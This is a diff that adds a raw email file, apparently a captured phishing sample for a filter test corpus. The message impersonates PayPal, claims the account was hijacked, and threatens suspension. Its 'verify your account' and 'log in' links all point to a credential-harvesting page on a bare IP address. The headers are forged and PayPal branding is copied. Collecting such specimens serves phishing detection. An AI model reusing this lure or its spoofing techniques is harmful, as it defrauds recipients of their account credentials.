@@ -1,0 +1,154 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <security@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 556EB469B5
+ for <user@login.example.com>; Fri,  6 Oct 2006 20:25:26 -0400 (EDT)
+Received: from 24.180.63.14 (24-180-63-14.static.rvsd.ca.charter.com
+ [24.180.63.14])
+ by mail.example.org (Postfix) with SMTP id CD06F6FA445
+ for <user@example.com>; Fri,  6 Oct 2006 20:25:25 -0400 (EDT)
+Received: from 242.9.180.169 by ; Sat, 07 Oct 2006 07:17:25 +0600
+Message-ID: <MZEAARHYSIPWNTNKIFXIKLC@comcast.net>
+From: "PayPal Inc." <service@paypal.com>
+Reply-To: " PayPal" <security@paypal.com>
+To: user@example.com
+Subject: PayPal Account - Suspicious Activity
+Date: Sat, 07 Oct 2006 03:25:25 +0200
+X-Mailer: Microsoft Outlook Express 5.50.4522.1200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--06089444370181865966"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 389
+
+----06089444370181865966
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>=0A=0A=0A=0A=0A=0A=0A=0A<head>=0A=0A=0A=0A<meta http-equiv=3D"Conten=
+t-Type" content=3D"text/html; charset=3Dwindows-1252">=0A=0A=0A=0A<meta na=
+me=3D"GENERATOR" content=3D"Microsoft FrontPage 4.0">=0A=0A=0A=0A<meta nam=
+e=3D"ProgId" content=3D"FrontPage.Editor.Document">=0A=0A=0A=0A<title>New =
+Page 1</title>=0A=0A=0A=0A<META NAME=3D"GENERATOR" Content=3D"Microsoft Fr=
+ontPage 4.0">=0A=0A=0A=0A<TITLE></TITLE>=0A=0A=0A=0A<STYLE type=3Dtext/css=
+>=0A=0A=0A=0A.dummy {}=0A=0A=0A=0ABODY, TD {font-family: verdana,arial,hel=
+vetica,sans-serif;font-size:=0A=0A=0A=0A12px;color: #000000;}=0A=0A=0A=0AL=
+I {line-height: 120%;}=0A=0A=0A=0AUL.ppsmallborder {margin:10px 5px 10px 2=
+0px;}=0A=0A=0A=0ALI.ppsmallborderli {margin:0px 0px 5px 0px;}=0A=0A=0A=0AU=
+L.pp_narrow {margin:10px 5px 0px 40px;}=0A=0A=0A=0Ahr.dotted {width: 100=
+%; margin-top: 0px; margin-bottom: 0px; border-left:=0A=0A=0A=0A#fff; bord=
+er-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}=0A=0A=0A=
+=0A.pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:=0A=
+=0A=0A=0A10px;font-weight: bold;color: #000000;}=0A=0A=0A=0A.pp_serifbig {=
+font-family: serif;font-size: 20px;font-weight: bold;color:=0A=0A=0A=0A#00=
+0000;}=0A=0A=0A=0A.pp_serif{font-family: serif;font-size: 16px;color: #000=
+000;}=0A=0A=0A=0A.pp_sansserif{font-family: verdana,arial,helvetica,sans-s=
+erif; font-size:=0A=0A=0A=0A16px;color: #000000;}=0A=0A=0A=0A.pp_heading {=
+font-family: verdana,arial,helvetica,sans-serif;font-size:=0A=0A=0A=0A18px=
+;font-weight: bold;color: #003366;} =0A=0A=0A=0A.pp_subheadingeoa {font-fa=
+mily:=0A=0A=0A=0Averdana,arial,helvetica,sans-serif;font-size: 15px;font-w=
+eight: bold;color:=0A=0A=0A=0A#000000;} =0A=0A=0A=0A.pp_subheading {font-f=
+amily: verdana,arial,helvetica,sans-serif;font-size:=0A=0A=0A=0A16px;font-=
+weight: bold;color: #003366;} =0A=0A=0A=0A.pp_sidebartext {font-family: ve=
+rdana,arial,helvetica,sans-serif;font-size:=0A=0A=0A=0A11px;color: #003366=
+;} =0A=0A=0A=0A.pp_sidebartextbold {font-family:=0A=0A=0A=0Averdana,arial,=
+helvetica,sans-serif;font-size: 11px;font-weight: bold;color:=0A=0A=0A=0A#=
+003366;} =0A=0A=0A=0A.pp_footer {font-family: verdana,arial,helvetica,sans=
+-serif;font-size:=0A=0A=0A=0A11px;color: #aaaaaa;}=0A=0A=0A=0A.pp_button {=
+font-size: 13px; font-family:=0A=0A=0A=0Averdana,arial,helvetica,sans-seri=
+f; font-weight: 400; border-style:outset;=0A=0A=0A=0Acolor:#000000; backgr=
+ound-color: #cccccc;}=0A=0A=0A=0A.pp_smaller {font-family: verdana,arial,h=
+elvetica,sans-serif;font-size:=0A=0A=0A=0A10px;color: #000000;}=0A=0A=0A=0A=
+pp_smallersidebar {font-family:=0A=0A=0A=0Averdana,arial,helvetica,sans-s=
+erif;font-size: 10px;color: #003366;}=0A=0A=0A=0A.ppem106 {font-weight: 70=
+0;}=0A=0A=0A=0A</STYLE>=0A=0A=0A=0A=0A=0A=0A=0A</head>=0A=0A=0A=0A=0A=0A=0A=
+=0A<body>=0A=0A=0A=0A=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D600 align=3Dcenter border=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR vAl=
+ign=3Dtop>=0A=0A=0A=0A<TD><A href=3D"http://58.177.253.94/.../.paypal-sk/u=
+pdate-paypal/cgi-bin/secure/login/login.html"=0A=0A=0A=0A     ><IMG height=
+=3D35 alt=3DPayPal src=3D"http://images.paypal.com/en_US/i/logo/email_logo=
+gif" width=3D255 border=3D0></A> =0A</TD></TR></TBODY></TABLE>=0A=0A=0A=0A=
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>=0A=0A=0A=
+=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD width=3D"100%" background=3Dhttp=
+://images.paypal.com/images/bg_clk.gif><IMG height=3D29 =0Asrc=3D"http://i=
+mages.paypal.com/images/pixel.gif" width=3D1 border=3D0></TD></TR>=0A=0A=0A=
+=0A<TR>=0A=0A=0A=0A<TD><IMG height=3D10 src=3D"http://images.paypal.com/im=
+ages/pixel.gif" width=3D1 border=3D0></TD></TR></TBODY></TABLE>=0A=0A=0A=0A=
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 align=3Dcenter border=3D=
+0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR vAlign=3Dtop>=0A=0A=0A=0A<TD width=3D=
+400>=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D5 width=3D"100=
+%" border=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR vAlign=3Dtop>=0A=0A=0A=0A=
+<TD>=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100=
+%" border=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dp=
+p_heading align=3Dleft><BR> Security Center Advisory!</TD></TR></TBODY></T=
+ABLE></TD></TR>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD><BR> We recently noticed on=
+e or more attempts to log in to your PayPal account from a =0A=0A=0A=0Afor=
+eign IP address and we have reasons to belive that your account was hijack=
+ed =0A=0A=0A=0Aby a third party without your authorization. If you recentl=
+y accessed your account while traveling, the unusual log in =0Aattempts=0A=
+=0A=0A=0Amay have been initiated by you.<BR>=0A=0A=0A=0A<BR>If you are the=
+ rightful holder of the account you must <B>click the link below</B> and t=
+hen complete all steps from =0Athe following page as we try to verify your=
+ identity.<BR><BR>=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D1 width=
+=3D"75%" align=3Dleft bgColor=3D#ffe65c border=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=
+=0A=0A<TR>=0A=0A=0A=0A<TD>=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D=
+4 width=3D"100%" align=3Dcenter bgColor=3D#fffecd border=3D0>=0A=0A=0A=0A<=
+TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dpp_sansserif align=3Dmiddle>=
+<A =0Ahref=3D"http://58.177.253.94/.../.paypal-sk/update-paypal/cgi-bin/se=
+cure/login/login.html" =0A=0A=0A=0A                       >Click here to v=
+erify your =0Aaccount</A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TAB=
+LE><BR><BR><BR><BR>If you choose to ignore our request, you =0Aleave us no=
+ choise but to temporaly suspend =0A=0A=0A=0Ayour account.<BR><BR>Thank yo=
+u for using PayPal! The PayPal Team </TD></TR>=0A=0A=0A=0A<TR>=0A=0A=0A=0A=
+<TD>=0A=0A=0A=0A<HR class=3Ddotted>=0A=0A=0A=0A</TD></TR>=0A=0A=0A=0A<TR>=0A=
+=0A=0A=0A<TD>=0A=0A=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"1=
+00%" border=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3D=
+pp_footer>Please do not reply to this e-mail. Mail sent to this =0A=0Aaddr=
+ess cannot be answered. For assistance, <A =0Ahref=3D"http://58.177.253.94=
+/.../.paypal-sk/update-paypal/cgi-bin/secure/login/login.html" =0A=0A=0A=0A=
+                 >log in</A> to your PayPal account and choose the "Help" =
+link in the footer of any page.<BR><BR =0Aclass=3Dh10>To receive email not=
+ifications in plain text instead of HTML, update your preferences <A =0Ahr=
+ef=3D"https://www.paypal.com/row/PREFS-NOTI">here</A>. </TD></TR>=0A=0A=0A=
+=0A<TR>=0A=0A=0A=0A<TD><IMG height=3D10 src=3D"http://images.paypal.com/en=
+_US/i/scr/pixel.gif" width=3D1 =0Aborder=3D0></TD></TR></TBODY></TABLE></T=
+D></TR>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD><BR><SPAN class=3Dpp_footer>PayPal =
+Email ID PP697</SPAN></TD></TR></TBODY></TABLE></TD>=0A=0A=0A=0A<TD><IMG h=
+eight=3D1 src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif" width=3D1=
+0 border=3D0></TD>=0A=0A=0A=0A<TD vAlign=3Dtop width=3D190>=0A=0A=0A=0A<TA=
+BLE cellSpacing=3D0 cellPadding=3D1 width=3D"100%" bgColor=3D#cccccc borde=
+r=3D0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD>=0A=0A=0A=0A<TABL=
+E cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff border=3D=
+0>=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD>=0A=0A=0A=0A<TABLE ce=
+llSpacing=3D0 cellPadding=3D5 width=3D"100%" bgColor=3D#eeeeee border=3D0>=
+=0A=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dpp_sidebartextb=
+old align=3Dmiddle>Protect Your Account Info</TD></TR></TBODY></TABLE>=0A=0A=
+=0A=0A<TABLE cellSpacing=3D0 cellPadding=3D5 width=3D"100%" border=3D0>=0A=
+=0A=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dpp_sidebartext><BR=
+>Make sure you never provide your password to fraudulent persons. <BR><BR>=
+PayPal =0Aautomatically encrypts your confidential information using the S=
+ecure Sockets Layer protocol (SSL) with an encryption =0Akey length of 128=
+-bits (the highest level commercially available).<BR><BR>PayPal will never=
+ ask you to enter your =0Apassword in an email.<BR><BR>For more informatio=
+n on protecting yourself from fraud, please review our Security Tips at =0A=
+http://www.paypal.com/securitytips<BR><IMG height=3D5 src=3D"http://images=
+paypal.com/images/pixel.gif" width=3D1 border=3D0> =0A</TD></TR></TBODY><=
+/TABLE></TD></TR>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD>=0A=0A=0A=0A<TABLE cellSp=
+acing=3D0 cellPadding=3D5 width=3D"100%" bgColor=3D#eeeeee border=3D0>=0A=0A=
+=0A=0A<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dpp_sidebartextbold al=
+ign=3Dmiddle>Protect Your Password</TD></TR></TBODY></TABLE>=0A=0A=0A=0A<T=
+ABLE cellSpacing=3D0 cellPadding=3D5 width=3D"100%" border=3D0>=0A=0A=0A=0A=
+<TBODY>=0A=0A=0A=0A<TR>=0A=0A=0A=0A<TD class=3Dpp_sidebartext>You should <=
+SPAN class=3Dppem106>never</SPAN> give your PayPal password to anyone, inc=
+luding =0APayPal employees.<BR><IMG height=3D5 src=3D"http://images.paypal=
+com/en_US/i/scr/pixel.gif" width=3D1 =0Aborder=3D0></TD></TR></TBODY></TA=
+BLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY>=
+</TABLE>=0A=0A=0A=0A</BODY>=0A=0A=0A=0A</HTML>=0A=0A=0A=0A=0A
+
+----06089444370181865966--
